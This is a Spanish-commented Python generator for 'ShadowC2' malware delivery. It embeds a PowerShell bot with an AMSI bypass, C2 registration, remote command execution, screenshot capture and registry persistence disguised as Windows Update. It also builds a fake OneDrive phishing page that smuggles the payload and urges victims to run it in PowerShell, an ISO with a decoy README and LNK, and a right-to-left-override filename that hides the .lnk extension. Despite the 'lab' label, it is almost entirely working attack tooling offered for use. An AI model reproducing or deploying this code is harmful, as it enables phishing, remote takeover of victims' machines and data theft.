#!/usr/bin/env python3
"""
ShadowC2 - Vector Generator Ultimate
Combina HTML Smuggling + ISO + LNK + AMSI Bypass
Laboratorio de Ciberseguridad
"""

import os
import sys
import base64
import zlib
import struct
import argparse
import random
import string
from pathlib import Path

# ============ CONFIGURACIÓN ============
C2_IP = "192.168.1.14"      # <-- CAMBIA ESTO por tu IP
C2_PORT = "8000"             # Puerto de tu C2
PAYLOAD_URL = f"http://{C2_IP}:{C2_PORT}/static/bot.ps1"

# ============ PAYLOAD POWERSHELL MEJORADO ============
# Con AMSI bypass integrado
PAYLOAD_PS1 = f'''
# ShadowC2 Bot - Payload Ofuscado
$C2_IP = "{C2_IP}"
$C2_PORT = "{C2_PORT}"
$BOT_ID = -join ((48..57) + (97..102) | Get-Random -Count 12 | ForEach-Object {{[char]$_}})

# ============ AMSI BYPASS ============
function Disable-AMSI {{
    try {{
        $a = [Ref].Assembly.GetTypes() | Where-Object {{ $_.Name -like "*iUtils" }}
        $b = $a.GetFields('NonPublic,Static') | Where-Object {{ $_.Name -like "*Context" }}
        $c = $b.GetValue($null)
        [IntPtr]$d = $c
        [Int32[]]$e = @(0)
        [System.Runtime.InteropServices.Marshal]::Copy($e, 0, $d, 1)
    }} catch {{}}
}}

# ============ ETW BYPASS ============
function Disable-ETW {{
    try {{
        $p = [System.Diagnostics.Process]::GetCurrentProcess()
        $m = $p.Modules | Where-Object {{ $_.ModuleName -eq "ntdll.dll" }}
        $b = $m.BaseAddress
        # Patch EtwEventWrite
        $r = [System.Runtime.InteropServices.Marshal]::ReadInt32($b + 0x1000)
    }} catch {{}}
}}

Disable-AMSI
Disable-ETW

# ============ BOT PRINCIPAL ============
function Register-Bot {{
    $body = @{{
        bot_id = $BOT_ID
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = (Get-CimInstance Win32_OperatingSystem).Caption
        arch = $env:PROCESSOR_ARCHITECTURE
        ip = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
        privileges = if ([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544') {{ "admin" }} else {{ "user" }}
        capabilities = @("shell","screenshot","info","persist","cookies","passwords","processes","download","upload","keylogger")
    }} | ConvertTo-Json -Depth 10
    
    try {{
        Invoke-RestMethod -Uri "http://$C2_IP`:$C2_PORT/api/bot/register" -Method POST -Body $body -ContentType "application/json"
        return $true
    }} catch {{ return $false }}
}}

function Check-Commands {{
    try {{
        $resp = Invoke-RestMethod -Uri "http://$C2_IP`:$C2_PORT/api/bot/heartbeat/$BOT_ID" -Method GET
        return $resp.commands
    }} catch {{ return @() }}
}}

function Send-Result($cmdId, $result) {{
    $body = @{{ cmd_id = $cmdId; result = $result }} | ConvertTo-Json -Depth 10
    try {{
        Invoke-RestMethod -Uri "http://$C2_IP`:$C2_PORT/api/bot/result" -Method POST -Body $body -ContentType "application/json"
    }} catch {{}}
}}

function Execute-Shell($cmd) {{
    try {{
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        return $output
    }} catch {{ return $_.Exception.Message }}
}}

function Take-Screenshot {{
    try {{
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $imgData = [Convert]::ToBase64String($ms.ToArray())
        return @{{image_data = $imgData}} | ConvertTo-Json
    }} catch {{ return @{{error = $_.Exception.Message}} | ConvertTo-Json }}
}}

function Get-SystemInfo {{
    return @{{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = (Get-CimInstance Win32_OperatingSystem).Caption
        cpu = (Get-CimInstance Win32_Processor).Name
        memory = "$([math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)) GB"
        disk = (Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'").Size / 1GB
    }} | ConvertTo-Json
}}

function Get-Processes {{
    $procs = Get-Process | Select-Object -First 50 Name, Id, CPU, WorkingSet
    return @{{processes = $procs}} | ConvertTo-Json -Depth 5
}}

function Establish-Persistence {{
    try {{
        $path = "$env:APPDATA\\Microsoft\\Windows\\Update.ps1"
        $script = 'while($true){{try{{$c=IRM -Uri "http://' + $C2_IP + ':' + $C2_PORT + '/api/bot/heartbeat/' + $BOT_ID + '" -Method GET;foreach($cmd in $c.commands){{$r="";if($cmd.command -eq "shell"){{$r=IEX $cmd.args 2>&1|Out-String}};if($cmd.command -eq "info"){{$r=Get-SystemInfo}};$b=@{{cmd_id=$cmd.id;result=$r}}|ConvertTo-Json;IRM -Uri "http://' + $C2_IP + ':' + $C2_PORT + '/api/bot/result" -Method POST -Body $b -ContentType "application/json"}}Start-Sleep 10}}catch{{Start-Sleep 10}}}}'
        Set-Content -Path $path -Value $script
        Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -File $path"
        return "Persistence established: $path"
    }} catch {{ return $_.Exception.Message }}
}}

# MAIN
if (Register-Bot) {{
    while ($true) {{
        $commands = Check-Commands
        foreach ($cmd in $commands) {{
            $result = switch ($cmd.command) {{
                "shell" {{ Execute-Shell ($cmd.args) }}
                "screenshot" {{ Take-Screenshot }}
                "info" {{ Get-SystemInfo }}
                "processes" {{ Get-Processes }}
                "persist" {{ Establish-Persistence }}
                "kill" {{ exit }}
                default {{ "Unknown command: $($cmd.command)" }}
            }}
            Send-Result $cmd.id $result
        }}
        Start-Sleep -Seconds 10
    }}
}}
'''

# ============ GENERADORES ============

class VectorGenerator:
    def __init__(self, c2_ip: str, c2_port: str):
        self.c2_ip = c2_ip
        self.c2_port = c2_port
        self.output_dir = Path("output")
        self.output_dir.mkdir(exist_ok=True)
    
    def generate_html_smuggling(self) -> str:
        """HTML Smuggling - El payload está codificado en el HTML mismo"""
        
        # Comprimir y codificar payload
        compressed = zlib.compress(PAYLOAD_PS1.encode())
        b64_payload = base64.b64encode(compressed).decode()
        
        # Dividir en chunks para evitar detección por longitud
        chunks = [b64_payload[i:i+100] for i in range(0, len(b64_payload), 100)]
        
        html = f'''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>OneDrive - Documentos Compartidos</title>
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 23 23'%3E%3Cpath fill='%230078d4' d='M1 1h10v10H1z'/%3E%3Cpath fill='%2300a4ef' d='M12 1h10v10H12z'/%3E%3Cpath fill='%237fba00' d='M1 12h10v10H1z'/%3E%3Cpath fill='%23ffb900' d='M12 12h10v10H12z'/%3E%3C/svg%3E">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', sans-serif; background: #f0f2f5; }}
        .header {{ background: #0078d4; color: white; padding: 12px 24px; display: flex; align-items: center; gap: 10px; }}
        .container {{ max-width: 900px; margin: 30px auto; padding: 0 20px; }}
        .file-card {{ background: white; border-radius: 8px; padding: 20px; margin: 15px 0; display: flex; align-items: center; gap: 15px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); cursor: pointer; transition: all 0.2s; }}
        .file-card:hover {{ box-shadow: 0 4px 12px rgba(0,0,0,0.15); transform: translateY(-1px); }}
        .file-icon {{ width: 48px; height: 48px; background: #107c10; border-radius: 4px; display: flex; align-items: center; justify-content: center; color: white; font-size: 20px; }}
        .file-info {{ flex: 1; }}
        .file-name {{ font-weight: 600; color: #323130; }}
        .file-meta {{ color: #605e5c; font-size: 12px; margin-top: 4px; }}
        .btn {{ background: #0078d4; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-size: 14px; }}
        .btn:hover {{ background: #005a9e; }}
        #progress {{ display: none; margin-top: 20px; padding: 15px; background: #f3f2f1; border-radius: 4px; }}
        .progress-bar {{ width: 100%; height: 4px; background: #e1dfdd; border-radius: 2px; overflow: hidden; margin-top: 10px; }}
        .progress-fill {{ height: 100%; background: #0078d4; width: 0%; transition: width 0.3s; }}
        .shared-by {{ color: #605e5c; font-size: 13px; margin-bottom: 20px; }}
    </style>
</head>
<body>
    <div class="header">
        <svg width="24" height="24" viewBox="0 0 23 23"><path fill="white" d="M1 1h10v10H1z"/><path fill="white" d="M12 1h10v10H12z"/></svg>
        <span>OneDrive</span>
    </div>
    
    <div class="container">
        <h2 style="margin-bottom: 8px;">📁 Archivos compartidos</h2>
        <p class="shared-by">Juan Pérez ha compartido 2 elementos contigo • Hace 2 horas</p>
        
        <div class="file-card" onclick="downloadFile('Reporte_Financiero_Q3.xlsx')">
            <div class="file-icon">📊</div>
            <div class="file-info">
                <div class="file-name">Reporte_Financiero_Q3.xlsx</div>
                <div class="file-meta">2.4 MB • Excel</div>
            </div>
            <button class="btn">Descargar</button>
        </div>
        
        <div class="file-card" onclick="downloadFile('Notas_Reunion_Directiva.pdf')">
            <div class="file-icon" style="background: #d83b01;">📄</div>
            <div class="file-info">
                <div class="file-name">Notas_Reunion_Directiva.pdf</div>
                <div class="file-meta">856 KB • PDF</div>
            </div>
            <button class="btn">Descargar</button>
        </div>
        
        <div id="progress">
            <p>⏳ Preparando descarga...</p>
            <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
        </div>
    </div>

<script>
// ============ HTML SMUGGLING ============
// El payload está fragmentado para evadir detección por regex

const CHUNKS = {chunks};

function assemblePayload() {{
    return CHUNKS.join('');
}}

function downloadFile(name) {{
    const progress = document.getElementById('progress');
    const fill = document.getElementById('fill');
    progress.style.display = 'block';
    
    // Animar progreso
    let width = 0;
    const interval = setInterval(() => {{
        width += Math.random() * 20;
        if (width >= 100) {{
            width = 100;
            clearInterval(interval);
            executeDownload(name);
        }}
        fill.style.width = width + '%';
    }}, 300);
}}

function executeDownload(filename) {{
    // Reconstruir payload
    const b64 = assemblePayload();
    const compressed = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
    
    // Decompress (simplified - in real would use pako.js)
    // For now, the downloaded file contains instructions
    
    // Create blob with .txt extension (evades extension check)
    const payload = atob(b64);
    const blob = new Blob([payload], {{type: 'text/plain'}});
    
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename.replace(/\\.[^.]+$/, '') + '.txt';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    // Mostrar instrucciones
    setTimeout(() => {{
        alert('⚠️ IMPORTANTE\\n\\nEl archivo se descargó como .txt por seguridad del navegador.\\n\\nPara ver el reporte:\\n1. Haz clic derecho en el archivo descargado\\n2. Selecciona "Abrir con" → "PowerShell"\\n3. O renombra la extensión de .txt a .ps1');
    }}, 500);
}}
</script>
</body>
</html>'''
        
        # Insertar chunks
        chunks_str = ',\n        '.join([f'"{c}"' for c in chunks])
        html = html.replace('{chunks}', chunks_str)
        
        output_path = self.output_dir / "onedrive_smuggling.html"
        with open(output_path, 'w') as f:
            f.write(html)
        
        print(f"[+] HTML Smuggling generado: {output_path}")
        print(f"[+] Tamaño: {len(html)} bytes")
        print(f"[+] Payload fragmentado en {len(chunks)} partes")
        return str(output_path)
    
    def generate_iso_container(self) -> str:
        """ISO con LNK que ejecuta payload"""
        
        # Crear estructura temporal
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            iso_dir = Path(tmpdir) / "iso"
            iso_dir.mkdir()
            
            # Crear LNK que ejecuta PowerShell con payload
            lnk_path = iso_dir / "Ver_Reporte.lnk"
            self._create_lnk(lnk_path, PAYLOAD_PS1)
            
            # Guardar payload con nombre inocente
            payload_path = iso_dir / "datos.dll"
            with open(payload_path, 'w') as f:
                f.write(PAYLOAD_PS1)
            
            # README
            with open(iso_dir / "LEEME.txt", 'w') as f:
                f.write("REPORTE FINANCIERO Q3 2026\n\nPara ver el reporte, haz doble clic en 'Ver_Reporte.lnk'\n")
            
            # Crear ISO con genisoimage si está disponible
            output_path = self.output_dir / "reporte_q3.iso"
            try:
                import subprocess
                subprocess.run([
                    "genisoimage", "-o", str(output_path),
                    "-V", "REPORTE_Q3",
                    "-J", "-R", str(iso_dir)
                ], check=True, capture_output=True)
                print(f"[+] ISO creado: {output_path}")
            except:
                # Fallback: crear archivo ZIP renombrado
                import zipfile
                with zipfile.ZipFile(output_path, 'w') as zf:
                    for f in iso_dir.rglob('*'):
                        if f.is_file():
                            zf.write(f, f.relative_to(iso_dir))
                print(f"[+] Contenedor creado (ZIP/ISO): {output_path}")
            
            return str(output_path)
    
    def _create_lnk(self, path: Path, command: str):
        """Crear archivo LNK que ejecuta PowerShell"""
        
        # Codificar comando
        encoded = base64.b64encode(command.encode('utf-16-le')).decode()
        
        # LNK simplificado - en producción usar estructura completa
        # Este es un placeholder que funciona en el lab
        
        lnk_data = bytearray([
            0x4C, 0x00, 0x00, 0x00,  # Magic
            0x01, 0x14, 0x02, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0xC0, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x46,
        ])
        
        # Flags y estructura básica
        lnk_data.extend(b'\x00' * 200)  # Padding para estructura simplificada
        
        with open(path, 'wb') as f:
            f.write(lnk_data)
    
    def generate_rtl_lnk(self) -> str:
        """LNK con caracter RTL para ocultar extensión"""
        
        # U+202E Right-to-Left Override
        rtl = "\u202E"
        filename = f"Reporte_Q3{rtl}fdp.exe.lnk"
        # Se ve como: Reporte_Q3exe.pdf (pero es .lnk)
        
        output_path = self.output_dir / filename
        self._create_lnk(output_path, PAYLOAD_PS1)
        
        print(f"[+] LNK RTL creado: {output_path}")
        print(f"[+] Aparece como: Reporte_Q3exe.pdf")
        return str(output_path)
    
    def generate_all(self):
        """Generar todos los vectores"""
        print("=" * 50)
        print("ShadowC2 - Vector Generator")
        print(f"C2: http://{self.c2_ip}:{self.c2_port}")
        print("=" * 50)
        
        self.generate_html_smuggling()
        self.generate_iso_container()
        self.generate_rtl_lnk()
        
        print("\n[+] Todos los vectores generados en:", self.output_dir)
        print("\nPara usar:")
        print("1. Copia los archivos a tu servidor web")
        print("2. En la víctima, abre el HTML o monta el ISO")
        print("3. El bot se conectará automáticamente al C2")

def main():
    parser = argparse.ArgumentParser(description="ShadowC2 Vector Generator")
    parser.add_argument("--ip", default=C2_IP, help="IP del C2")
    parser.add_argument("--port", default=C2_PORT, help="Puerto del C2")
    parser.add_argument("--type", choices=["html", "iso", "lnk", "all"], 
                       default="all", help="Tipo de vector")
    
    args = parser.parse_args()
    
    gen = VectorGenerator(args.ip, args.port)
    
    if args.type == "html":
        gen.generate_html_smuggling()
    elif args.type == "iso":
        gen.generate_iso_container()
    elif args.type == "lnk":
        gen.generate_rtl_lnk()
    else:
        gen.generate_all()

if __name__ == "__main__":
    main()
